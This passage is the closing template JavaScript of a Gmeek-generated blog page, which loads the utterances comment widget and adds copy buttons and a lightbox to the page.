8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
var utterancesLoad=0;

console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathSearch").setAttribute("d",IconList["search"]);
document.getElementById("pathHome").setAttribute("d",IconList["home"]);




//function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);
    cmButton.style.display="none";

    script=document.createElement("script");
    
    //script.setAttribute("src","https://giscus.app/client.js");
    //script.setAttribute("data-repo","hst1189/hst1189.github.io");
    //script.setAttribute("data-repo-id","R_kgDOMq37aA");
    //script.setAttribute("data-category","Announcements");
    //script.setAttribute("data-category-id","DIC_kwDOMq37aM4CkJR");
    //script.setAttribute("data-mapping","pathname");
    //script.setAttribute("data-strict","0");
    //script.setAttribute("data-reactions-enabled","1");
    //script.setAttribute("data-emit-metadata","0");
    //script.setAttribute("data-input-position","bottom");
    //script.setAttribute("data-theme","preferred_color_scheme");
    //script.setAttribute("data-lang","zh-CN");
    //script.setAttribute("data-loading","lazy");
    //script.setAttribute("crossorigin","anonymous");
    //script.setAttribute("async","");
    
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","hst1189/hst1189.github.io");
    script.setAttribute("issue-term","title");
    
    script.setAttribute("theme","github-light");
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    
    cm.appendChild(script);
    int=self.setInterval("iFrameLoading()",200);
//}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utteranc');
    if(utterances.length==1){
        //if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("Comment Load OK");
        //}
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});

</script>
<script src='../assets/ArticleTOC.js'></script><script src='../assets/lightbox.js'></script><script>document.querySelectorAll('a').forEach(anchor => {const img = anchor.querySelector('img');if (img && img.hasAttribute('data-canonical-src')) {const canonicalSrc = img.getAttribute('data-canonical-src');anchor.setAttribute('href', canonicalSrc);img.setAttribute('src', canonicalSrc);img.removeAttribute('data-canonical-src');}});</script>

</html>
